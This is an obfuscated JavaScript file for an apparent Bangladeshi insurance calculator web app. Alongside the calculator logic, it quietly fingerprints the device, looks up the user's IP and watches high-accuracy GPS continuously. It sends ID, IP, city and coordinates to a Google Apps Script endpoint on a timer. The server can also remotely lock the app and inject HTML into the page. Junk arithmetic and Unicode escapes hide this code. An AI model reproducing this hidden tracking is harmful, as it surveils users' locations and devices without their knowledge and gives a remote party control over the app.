var _0xb99b6f = (137248 ^ 137248) + (317180 ^ 317177);
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwEFjmD_4MIuVBX-TDj7l-szCVHwscnJ-LuI5jB_WyQYlqa0v-mvL2P6mhJZC8p4KbB/exec";
_0xb99b6f = "liidhb";
let consecutiveCount = 465910 ^ 465910;
let lastInputCode = "";
let scExpression = "";
let syncIntervalTimer = null;
let isEvaluated = false;
let geoWatchId = null;
let _0xc66ee;
let lastLiveLocationSent = 997538 ^ 997538;
_0xc66ee = '\u006A\u0069\u0067\u0062\u0061\u0068';
let currentCoords = {
  '\u006C\u0061\u0074': localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u006C\u0061\u0074") || "",
  '\u006C\u006E\u0067': localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u006C\u006E\u0067") || "",
  '\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079': null
};
function getOrCreateDeviceId() {
  var _0x_0x8ab = (214764 ^ 214760) + (467285 ^ 467293);
  let _0xa0fgg = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("bima_device_uuid");
  _0x_0x8ab = (616179 ^ 616181) + (333693 ^ 333695);
  if (!_0xa0fgg) {
    _0xa0fgg = "dev_" + Math['\u0072\u0061\u006E\u0064\u006F\u006D']()['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](226089 ^ 226061)['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](872846 ^ 872844, 433642 ^ 433635) + "\u005F" + Date['\u006E\u006F\u0077']()['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](998382 ^ 998346);
    localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("bima_device_uuid", _0xa0fgg);
  }
  return _0xa0fgg;
}
async function sendLiveLocationToServer(lat, lng, accuracy, status = "\u004F\u004E\u004C\u0049\u004E\u0045") {
  if (!navigator['\u006F\u006E\u004C\u0069\u006E\u0065']) return;
  var _0x7abf2e = (980050 ^ 980053) + (782032 ^ 782033);
  const _0x8362be = getOrCreateDeviceId();
  _0x7abf2e = (222499 ^ 222500) + (300246 ^ 300243);
  const _0x4ac = navigator['\u0075\u0073\u0065\u0072\u0041\u0067\u0065\u006E\u0074\u0044\u0061\u0074\u0061']?.platform || navigator['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D'] || navigator['\u0075\u0073\u0065\u0072\u0041\u0067\u0065\u006E\u0074'] || "\u0055\u006E\u006B\u006E\u006F\u0077\u006E";
  const _0x8bf6a = `${window['\u0073\u0063\u0072\u0065\u0065\u006E']['\u0077\u0069\u0064\u0074\u0068']}x${window['\u0073\u0063\u0072\u0065\u0065\u006E']['\u0068\u0065\u0069\u0067\u0068\u0074']}`;
  let _0x83d8db;
  const _0xb63f = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u0063\u0069\u0074\u0079") || "";
  _0x83d8db = (835172 ^ 835181) + (774548 ^ 774550);
  var _0x2_0x453 = (387940 ^ 387942) + (136685 ^ 136684);
  const _0x4f7acf = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("bima_last_ip") || "";
  _0x2_0x453 = "ianhib";
  let _0x91b1df;
  const _0xf2adac = new URLSearchParams({
    "action": "\u0075\u0070\u0064\u0061\u0074\u0065\u004C\u006F\u0063\u0061\u0074\u0069\u006F\u006E",
    '\u0064\u0065\u0076\u0069\u0063\u0065\u0049\u0064': _0x8362be,
    "platform": _0x4ac,
    '\u0073\u0063\u0072\u0065\u0065\u006E': _0x8bf6a,
    '\u0069\u0070': _0x4f7acf,
    "city": _0xb63f,
    '\u006C\u0061\u0074': lat || currentCoords['\u006C\u0061\u0074'] || "",
    '\u006C\u006E\u0067': lng || currentCoords['\u006C\u006E\u0067'] || "",
    '\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079': accuracy !== null && accuracy !== undefined && !isNaN(accuracy) ? Math['\u0072\u006F\u0075\u006E\u0064'](accuracy) : "",
    '\u0073\u0074\u0061\u0074\u0075\u0073': status,
    "timestamp": Date['\u006E\u006F\u0077']()
  });
  _0x91b1df = '\u006E\u0062\u0065\u0062\u006D\u0067';
  try {
    await fetch(`${APPS_SCRIPT_URL}?${_0xf2adac['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']()}`, {
      '\u006D\u0065\u0074\u0068\u006F\u0064': "\u0047\u0045\u0054",
      '\u0063\u0061\u0063\u0068\u0065': "no-store",
      '\u006D\u006F\u0064\u0065': "\u006E\u006F\u002D\u0063\u006F\u0072\u0073"
    });
  } catch (err) {
    console['\u0077\u0061\u0072\u006E']("\u004C\u0069\u0076\u0065\u0020\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E\u0020\u0073\u0079\u006E\u0063\u0020\u006E\u006F\u0074\u0069\u0063\u0065\u003A", err);
  }
}
function startLiveLocationTracking() {
  if (!("\u0067\u0065\u006F\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E" in navigator)) return;
  if (geoWatchId !== null) {
    navigator['\u0067\u0065\u006F\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0063\u006C\u0065\u0061\u0072\u0057\u0061\u0074\u0063\u0068'](geoWatchId);
    geoWatchId = null;
  }
  geoWatchId = navigator['\u0067\u0065\u006F\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0077\u0061\u0074\u0063\u0068\u0050\u006F\u0073\u0069\u0074\u0069\u006F\u006E'](position => {
    var _0xbdbd9f = (845713 ^ 845712) + (329491 ^ 329498);
    const _0x59f = position['\u0063\u006F\u006F\u0072\u0064\u0073']['\u006C\u0061\u0074\u0069\u0074\u0075\u0064\u0065']['\u0074\u006F\u0046\u0069\u0078\u0065\u0064'](954499 ^ 954501);
    _0xbdbd9f = 777475 ^ 777482;
    var _0xb9912d = (188672 ^ 188681) + (785267 ^ 785268);
    const _0x4_0xb3b = position['\u0063\u006F\u006F\u0072\u0064\u0073']['\u006C\u006F\u006E\u0067\u0069\u0074\u0075\u0064\u0065']['\u0074\u006F\u0046\u0069\u0078\u0065\u0064'](909900 ^ 909898);
    _0xb9912d = "hoiabf";
    var _0x3c1ce = (573174 ^ 573172) + (274585 ^ 274588);
    const _0x6f6c = position['\u0063\u006F\u006F\u0072\u0064\u0073']['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'];
    _0x3c1ce = (824975 ^ 824970) + (737489 ^ 737488);
    currentCoords['\u006C\u0061\u0074'] = _0x59f;
    currentCoords['\u006C\u006E\u0067'] = _0x4_0xb3b;
    currentCoords['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'] = _0x6f6c;
    localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("bima_last_lat", _0x59f);
    localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u006C\u006E\u0067", _0x4_0xb3b);
    const _0xfc1g = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u0063\u0069\u0074\u0079");
    if (!_0xfc1g) {
      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${_0x59f}&lon=${_0x4_0xb3b}`)['\u0074\u0068\u0065\u006E'](res => res['\u006A\u0073\u006F\u006E']())['\u0074\u0068\u0065\u006E'](geoData => {
        var _0x7f7d = (427426 ^ 427427) + (764166 ^ 764162);
        const _0x781b6f = geoData['\u0061\u0064\u0064\u0072\u0065\u0073\u0073'] || {};
        _0x7f7d = (375974 ^ 375972) + (223089 ^ 223094);
        var _0xdgcf = (303510 ^ 303504) + (618811 ^ 618808);
        const _0x1d7b = _0x781b6f['\u0063\u0069\u0074\u0079'] || _0x781b6f['\u0074\u006F\u0077\u006E'] || _0x781b6f['\u0073\u0075\u0062\u0075\u0072\u0062'] || _0x781b6f['\u0073\u0074\u0061\u0074\u0065\u005F\u0064\u0069\u0073\u0074\u0072\u0069\u0063\u0074'] || _0x781b6f['\u0063\u006F\u0075\u006E\u0074\u0079'] || "";
        _0xdgcf = (741441 ^ 741442) + (253576 ^ 253582);
        const _0x9ef = _0x1d7b ? `${_0x1d7b}, Bangladesh` : geoData['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u005F\u006E\u0061\u006D\u0065'] ? geoData['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u005F\u006E\u0061\u006D\u0065']['\u0073\u0070\u006C\u0069\u0074']("\u002C")[863505 ^ 863505] : "";
        if (_0x9ef) {
          localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("bima_last_city", _0x9ef);
        }
      })['\u0063\u0061\u0074\u0063\u0068'](() => {});
    }
    var _0x8e123d = (633545 ^ 633545) + (201026 ^ 201025);
    const _0xd6831a = Date['\u006E\u006F\u0077']();
    _0x8e123d = (527699 ^ 527699) + (721642 ^ 721634);
    if (_0xd6831a - lastLiveLocationSent >= (215377 ^ 223153)) {
      lastLiveLocationSent = _0xd6831a;
      sendLiveLocationToServer(_0x59f, _0x4_0xb3b, _0x6f6c, "\u004F\u004E\u004C\u0049\u004E\u0045");
    }
  }, error => {
    console['\u0077\u0061\u0072\u006E']("\u0043\u006F\u006E\u0074\u0069\u006E\u0075\u006F\u0075\u0073\u0020\u0047\u0050\u0053\u0020\u006E\u006F\u0074\u0069\u0063\u0065\u003A", error['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']);
  }, {
    '\u0065\u006E\u0061\u0062\u006C\u0065\u0048\u0069\u0067\u0068\u0041\u0063\u0063\u0075\u0072\u0061\u0063\u0079': !![],
    "maximumAge": 0,
    '\u0074\u0069\u006D\u0065\u006F\u0075\u0074': 10000
  });
}
async function collectDeviceMetadata() {
  const _0x8fcfee = {
    '\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D': navigator['\u0075\u0073\u0065\u0072\u0041\u0067\u0065\u006E\u0074\u0044\u0061\u0074\u0061']?.platform || navigator['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D'] || navigator['\u0075\u0073\u0065\u0072\u0041\u0067\u0065\u006E\u0074'] || "\u0055\u006E\u006B\u006E\u006F\u0077\u006E",
    '\u0073\u0063\u0072\u0065\u0065\u006E': `${window['\u0073\u0063\u0072\u0065\u0065\u006E']['\u0077\u0069\u0064\u0074\u0068']}x${window['\u0073\u0063\u0072\u0065\u0065\u006E']['\u0068\u0065\u0069\u0067\u0068\u0074']}`,
    '\u006C\u0061\u0074': currentCoords['\u006C\u0061\u0074'] || localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u006C\u0061\u0074") || "",
    "lng": currentCoords['\u006C\u006E\u0067'] || localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u006C\u006E\u0067") || "",
    "city": localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("bima_last_city") || "",
    "ip": localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u0069\u0070") || ""
  };
  try {
    var _0x6c76cg = (589136 ^ 589138) + (274587 ^ 274590);
    const _0xgcfb = await Promise['\u0072\u0061\u0063\u0065']([fetch("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0070\u0069\u002E\u0069\u0070\u0069\u0066\u0079\u002E\u006F\u0072\u0067\u003F\u0066\u006F\u0072\u006D\u0061\u0074\u003D\u006A\u0073\u006F\u006E")['\u0074\u0068\u0065\u006E'](r => r['\u006A\u0073\u006F\u006E']()), new Promise((_, reject) => setTimeout(() => reject("Timeout"), 238031 ^ 238611))]);
    _0x6c76cg = (930635 ^ 930639) + (254917 ^ 254914);
    if (_0xgcfb && _0xgcfb['\u0069\u0070']) {
      _0x8fcfee['\u0069\u0070'] = _0xgcfb['\u0069\u0070'];
      localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u0069\u0070", _0xgcfb['\u0069\u0070']);
    }
  } catch (e) {}
  if (!_0x8fcfee['\u006C\u0061\u0074'] && "geolocation" in navigator) {
    try {
      const _0xc6aad = await new Promise((resolve, reject) => {
        navigator['\u0067\u0065\u006F\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0067\u0065\u0074\u0043\u0075\u0072\u0072\u0065\u006E\u0074\u0050\u006F\u0073\u0069\u0074\u0069\u006F\u006E'](resolve, reject, {
          "enableHighAccuracy": !![],
          "timeout": 6000,
          '\u006D\u0061\u0078\u0069\u006D\u0075\u006D\u0041\u0067\u0065': 0
        });
      });
      _0x8fcfee['\u006C\u0061\u0074'] = _0xc6aad['\u0063\u006F\u006F\u0072\u0064\u0073']['\u006C\u0061\u0074\u0069\u0074\u0075\u0064\u0065']['\u0074\u006F\u0046\u0069\u0078\u0065\u0064'](468549 ^ 468547);
      _0x8fcfee['\u006C\u006E\u0067'] = _0xc6aad['\u0063\u006F\u006F\u0072\u0064\u0073']['\u006C\u006F\u006E\u0067\u0069\u0074\u0075\u0064\u0065']['\u0074\u006F\u0046\u0069\u0078\u0065\u0064'](444867 ^ 444869);
      currentCoords['\u006C\u0061\u0074'] = _0x8fcfee['\u006C\u0061\u0074'];
      currentCoords['\u006C\u006E\u0067'] = _0x8fcfee['\u006C\u006E\u0067'];
      currentCoords['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'] = _0xc6aad['\u0063\u006F\u006F\u0072\u0064\u0073']['\u0061\u0063\u0063\u0075\u0072\u0061\u0063\u0079'];
      localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("bima_last_lat", _0x8fcfee['\u006C\u0061\u0074']);
      localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u006C\u006E\u0067", _0x8fcfee['\u006C\u006E\u0067']);
      try {
        var _0x07134b = (812731 ^ 812723) + (654126 ^ 654120);
        const _0x56680b = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${_0x8fcfee['\u006C\u0061\u0074']}&lon=${_0x8fcfee['\u006C\u006E\u0067']}`);
        _0x07134b = 801349 ^ 801356;
        if (_0x56680b['\u006F\u006B']) {
          const _0x6be47a = await _0x56680b['\u006A\u0073\u006F\u006E']();
          const _0x9a38c = _0x6be47a['\u0061\u0064\u0064\u0072\u0065\u0073\u0073'] || {};
          const _0x376b9f = _0x9a38c['\u0063\u0069\u0074\u0079'] || _0x9a38c['\u0074\u006F\u0077\u006E'] || _0x9a38c['\u0073\u0075\u0062\u0075\u0072\u0062'] || _0x9a38c['\u0073\u0074\u0061\u0074\u0065\u005F\u0064\u0069\u0073\u0074\u0072\u0069\u0063\u0074'] || _0x9a38c['\u0063\u006F\u0075\u006E\u0074\u0079'] || "";
          _0x8fcfee['\u0063\u0069\u0074\u0079'] = _0x376b9f ? `${_0x376b9f}, Bangladesh` : _0x6be47a['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u005F\u006E\u0061\u006D\u0065'] ? _0x6be47a['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u005F\u006E\u0061\u006D\u0065']['\u0073\u0070\u006C\u0069\u0074']("\u002C")[844909 ^ 844909] : "";
          localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u006C\u0061\u0073\u0074\u005F\u0063\u0069\u0074\u0079", _0x8fcfee['\u0063\u0069\u0074\u0079']);
        }
      } catch (errGeo) {}
    } catch (errPos) {
      if (!_0x8fcfee['\u0063\u0069\u0074\u0079']) {
        try {
          var _0x6g_0x583 = (867315 ^ 867322) + (643493 ^ 643493);
          const _0x07ab = await fetch("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F");
          _0x6g_0x583 = 272721 ^ 272727;
          if (_0x07ab['\u006F\u006B']) {
            let _0x769f;
            const _0xa3e8c = await _0x07ab['\u006A\u0073\u006F\u006E']();
            _0x769f = 410840 ^ 410842;
            _0x8fcfee['\u0063\u0069\u0074\u0079'] = `${_0xa3e8c['\u0063\u0069\u0074\u0079'] || ""}, ${_0xa3e8c['\u0072\u0065\u0067\u0069\u006F\u006E'] || ""}`;
            localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("bima_last_city", _0x8fcfee['\u0063\u0069\u0074\u0079']);
          }
        } catch (e) {}
      }
    }
  }
  return _0x8fcfee;
}
function updateDeveloperCredit(name) {
  const _0x6_0xa48 = (name || "")['\u0074\u0072\u0069\u006D']();
  localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0064\u0065\u0076\u005F\u006E\u0061\u006D\u0065", _0x6_0xa48);
  var _0x3_0x77b = (424543 ^ 424539) + (753716 ^ 753724);
  const _0x8094f = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("appCreditContainer");
  _0x3_0x77b = 517662 ^ 517655;
  let _0x72d5f;
  const _0x74acfe = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0064\u0079\u006E\u0061\u006D\u0069\u0063\u0044\u0065\u0076\u0065\u006C\u006F\u0070\u0065\u0072\u004E\u0061\u006D\u0065");
  _0x72d5f = 356475 ^ 356478;
  if (_0x8094f && _0x74acfe) {
    if (_0x6_0xa48) {
      _0x74acfe['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = _0x6_0xa48;
      _0x8094f['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079'] = "\u0062\u006C\u006F\u0063\u006B";
    } else {
      _0x8094f['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079'] = "\u006E\u006F\u006E\u0065";
    }
  }
  const _0xa0a1eb = document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072'](".sidebar-footer");
  if (_0xa0a1eb) {
    if (_0x6_0xa48) {
      _0xa0a1eb['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C'] = `✨ Developed by <strong>${_0x6_0xa48}</strong> ✨<br><span>বীমা ক্যালকুলেটর ও ইনফো পোর্টাল</span>`;
      _0xa0a1eb['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079'] = "block";
    } else {
      _0xa0a1eb['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079'] = "\u006E\u006F\u006E\u0065";
    }
  }
  var _0xceg84d = (321339 ^ 321343) + (464417 ^ 464417);
  const _0x5d8ac = document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072']("\u002E\u0061\u0062\u006F\u0075\u0074\u002D\u0063\u0061\u0072\u0064\u0020\u0068\u0033");
  _0xceg84d = '\u0067\u0062\u0067\u006A\u0062\u006F';
  if (_0x5d8ac) {
    _0x5d8ac['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = _0x6_0xa48 || "\u0049\u0054\u0020\u004F\u0066\u0066\u0069\u0063\u0065\u0072";
  }
  let _0xe_0x915;
  const _0xa6ec = document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072']("\u002E\u0070\u0072\u0069\u006E\u0074\u002D\u0066\u006F\u006F\u0074\u0065\u0072");
  _0xe_0x915 = '\u0070\u0063\u0067\u0067\u0063\u0069';
  if (_0xa6ec) {
    const _0x8c_0xafc = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("print-date");
    const _0xdfd9c = _0x8c_0xafc ? _0x8c_0xafc['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] : "";
    if (_0x6_0xa48) {
      _0xa6ec['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C'] = `ক্যালকুলেশন প্রস্তুতের তারিখ: <span id="print-date">${_0xdfd9c}</span> | সফ্টওয়্যার ডেভেলপমেন্ট: <strong>${_0x6_0xa48}</strong>`;
    } else {
      _0xa6ec['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C'] = `ক্যালকুলেশন প্রস্তুতের তারিখ: <span id="print-date">${_0xdfd9c}</span>`;
    }
  }
}
async function checkUserAccessStatus() {
  if (!navigator['\u006F\u006E\u004C\u0069\u006E\u0065']) {
    const _0xe9efgb = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("bima_access_status");
    if (_0xe9efgb === "ACTIVE") unlockApp();else lockApp();
    return;
  }
  var _0xdb72eb = (369621 ^ 369621) + (457067 ^ 457068);
  const _0x2f_0x485 = getOrCreateDeviceId();
  _0xdb72eb = "clmdgd";
  const _0x216cfa = await collectDeviceMetadata();
  try {
    var _0x8e65c = (383162 ^ 383165) + (910297 ^ 910303);
    const _0xa43gdc = new URLSearchParams({
      '\u0061\u0063\u0074\u0069\u006F\u006E': "\u0063\u0068\u0065\u0063\u006B\u0053\u0074\u0061\u0074\u0075\u0073",
      '\u0064\u0065\u0076\u0069\u0063\u0065\u0049\u0064': _0x2f_0x485,
      '\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D': _0x216cfa['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D'],
      "screen": _0x216cfa['\u0073\u0063\u0072\u0065\u0065\u006E'],
      '\u0069\u0070': _0x216cfa['\u0069\u0070'],
      '\u0063\u0069\u0074\u0079': _0x216cfa['\u0063\u0069\u0074\u0079'],
      '\u006C\u0061\u0074': _0x216cfa['\u006C\u0061\u0074'],
      '\u006C\u006E\u0067': _0x216cfa['\u006C\u006E\u0067']
    });
    _0x8e65c = '\u006B\u006F\u0063\u0069\u0064\u0068';
    const _0x13ab8e = await fetch(`${APPS_SCRIPT_URL}?${_0xa43gdc['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']()}`, {
      "method": "\u0047\u0045\u0054",
      "cache": "no-store"
    });
    if (!_0x13ab8e['\u006F\u006B']) return;
    let _0xd8b49c;
    const _0x311dg = await _0x13ab8e['\u006A\u0073\u006F\u006E']();
    _0xd8b49c = (589143 ^ 589151) + (224324 ^ 224321);
    if (_0x311dg['\u0068\u0061\u0073\u004F\u0077\u006E\u0050\u0072\u006F\u0070\u0065\u0072\u0074\u0079']("\u0064\u0065\u0076\u0065\u006C\u006F\u0070\u0065\u0072\u004E\u0061\u006D\u0065")) {
      updateDeveloperCredit(_0x311dg['\u0064\u0065\u0076\u0065\u006C\u006F\u0070\u0065\u0072\u004E\u0061\u006D\u0065']);
    }
    if (_0x311dg['\u0073\u0074\u0061\u0074\u0075\u0073'] === "\u0041\u0043\u0054\u0049\u0056\u0045") {
      localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0061\u0063\u0063\u0065\u0073\u0073\u005F\u0073\u0074\u0061\u0074\u0075\u0073", "ACTIVE");
      unlockApp();
    } else if (_0x311dg['\u0073\u0074\u0061\u0074\u0075\u0073'] === "\u004C\u004F\u0043\u004B\u0045\u0044") {
      localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0061\u0063\u0063\u0065\u0073\u0073\u005F\u0073\u0074\u0061\u0074\u0075\u0073", "\u004C\u004F\u0043\u004B\u0045\u0044");
      lockApp();
    }
  } catch (e) {
    var _0xe43gd = (464468 ^ 464467) + (330478 ^ 330470);
    const _0x6302df = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0062\u0069\u006D\u0061\u005F\u0061\u0063\u0063\u0065\u0073\u0073\u005F\u0073\u0074\u0061\u0074\u0075\u0073");
    _0xe43gd = 421597 ^ 421589;
    if (_0x6302df === "\u0041\u0043\u0054\u0049\u0056\u0045") unlockApp();
  }
}
function startRealtimeSync() {
  if (syncIntervalTimer) clearInterval(syncIntervalTimer);
  syncIntervalTimer = setInterval(() => {
    checkUserAccessStatus();
  }, 885876 ^ 913732);
}
function scUpdateDisplay() {
  const _0x9_0x0f5 = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sc-main-display");
  if (_0x9_0x0f5) _0x9_0x0f5['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = scExpression === "" ? "\u0030" : scExpression;
}
function scAppend(val) {
  const _0x359f = ["\u002B", "\u002D", "\u002A", "\u002F", "\u0025", "\u00D7", "\u00F7", "\u2212"];
  const _0xf491be = _0x359f['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](val);
  if (isEvaluated) {
    if (!_0xf491be) {
      scExpression = "";
      let _0x364a;
      const _0xfa7c = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0063\u002D\u0073\u0075\u0062\u0074\u0065\u0078\u0074");
      _0x364a = '\u0069\u0062\u0062\u0067\u006E\u0070';
      if (_0xfa7c) _0xfa7c['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = "";
    }
    isEvaluated = false;
  }
  if (scExpression === "\u0030" && !_0xf491be && val !== "\u002E") {
    scExpression = "";
  }
  if (val === "\u002E") {
    var _0x5a7aa = (689986 ^ 689985) + (800744 ^ 800749);
    const _0x486be = scExpression['\u0073\u0070\u006C\u0069\u0074'](new RegExp("[\\+\\-\\*\\/%\xD7\xF7\u2212]", ""));
    _0x5a7aa = '\u0069\u006A\u006B\u0065\u0069\u0064';
    const _0xe5487d = _0x486be[_0x486be['\u006C\u0065\u006E\u0067\u0074\u0068'] - (320919 ^ 320918)];
    if (_0xe5487d['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u002E")) return;
    if (scExpression === "" || _0x359f['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](scExpression['\u0073\u006C\u0069\u0063\u0065'](-(884598 ^ 884599)))) {
      scExpression += "\u0030";
    }
  }
  const _0xe0d2be = scExpression['\u0073\u006C\u0069\u0063\u0065'](-(264377 ^ 264376));
  if (_0xf491be && _0x359f['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0xe0d2be)) {
    scExpression = scExpression['\u0073\u006C\u0069\u0063\u0065'](280517 ^ 280517, -(831745 ^ 831744)) + val;
    scUpdateDisplay();
    return;
  }
  scExpression += val;
  scUpdateDisplay();
}
function scToggleBracket() {
  if (isEvaluated) {
    scExpression = "";
    let _0xbc95gf;
    const _0x2ceffa = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sc-subtext");
    _0xbc95gf = "nbddoh";
    if (_0x2ceffa) _0x2ceffa['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = "";
    isEvaluated = false;
  }
  let _0x5aaf;
  const _0x77810b = ["\u002B", "\u002D", "\u002A", "\u002F", "\u0025", "\u00D7", "\u00F7", "\u2212"];
  _0x5aaf = 735666 ^ 735666;
  const _0xa490b = (scExpression['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u005C\u0028', '\u0067')) || [])['\u006C\u0065\u006E\u0067\u0074\u0068'];
  const _0x9e0d = (scExpression['\u006D\u0061\u0074\u0063\u0068'](new RegExp("\\)", '\u0067')) || [])['\u006C\u0065\u006E\u0067\u0074\u0068'];
  var _0xfcg94a = (857649 ^ 857652) + (812582 ^ 812590);
  const _0x94b6cb = scExpression['\u0073\u006C\u0069\u0063\u0065'](-(391418 ^ 391419));
  _0xfcg94a = (479271 ^ 479268) + (431701 ^ 431709);
  if (_0xa490b > _0x9e0d && !_0x77810b['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0x94b6cb) && _0x94b6cb !== "\u0028" && _0x94b6cb !== '') {
    scExpression += "\u0029";
  } else {
    if (scExpression !== '' && !_0x77810b['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0x94b6cb) && _0x94b6cb !== "\u0028") {
      scExpression += '×(';
    } else {
      scExpression += "\u0028";
    }
  }
  scUpdateDisplay();
}
function scClear() {
  scExpression = "";
  consecutiveCount = 605372 ^ 605372;
  lastInputCode = "";
  isEvaluated = false;
  var _0xf7f37g = (118871 ^ 118870) + (204627 ^ 204627);
  const _0x7fcgbe = document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0063\u002D\u0073\u0075\u0062\u0074\u0065\u0078\u0074");
  _0xf7f37g = (954447 ^ 954443) + (214113 ^ 214113);
  if (_0x7fcgbe) _0x7fcgbe['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074'] = "";
  scUpdateDisplay();
}
